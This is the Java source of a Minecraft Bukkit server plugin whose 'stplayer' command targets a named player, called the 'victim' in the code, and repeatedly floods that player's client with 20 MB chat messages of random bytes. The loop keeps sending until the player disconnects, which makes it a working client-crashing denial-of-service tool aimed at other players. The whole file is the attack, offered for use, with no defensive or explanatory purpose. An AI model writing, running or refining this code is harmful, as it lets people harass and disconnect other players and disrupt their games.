package com.itakinn;

import java.util.Random;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;

public class Main extends JavaPlugin {

    public void onEnable() {
        this.getCommand("stplayer").setExecutor(this);
    }

    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (sender.hasPermission("stplayer.use") || !(sender instanceof Player)) {
            Player victim = Bukkit.getPlayer(args[0]);
            sender.sendMessage("Wait some seconds ;)");
            Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
                for (int i = 0; i < 5; ++i) {
                    if (victim == null || !victim.isOnline()) {
                        sender.sendMessage("Player offline or not found.");
                    }else {
                        this.stressPlayer(victim);
                    }

                }
            });
            return true;
        } else {
            sender.sendMessage("No permission.");
            return false;
        }
    }

    private void stressPlayer(Player victim) {
        try {
            byte[] data = new byte[20971520]; // 20 MB
            new Random().nextBytes(data);
            this.sendLargeMessage(victim, data);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void sendLargeMessage(Player player, byte[] data) {
        String dataString = new String(data);
        while (player.isOnline() && !dataString.isEmpty()) {
            player.sendMessage(player.getUniqueId(), dataString);
        }
    }
}
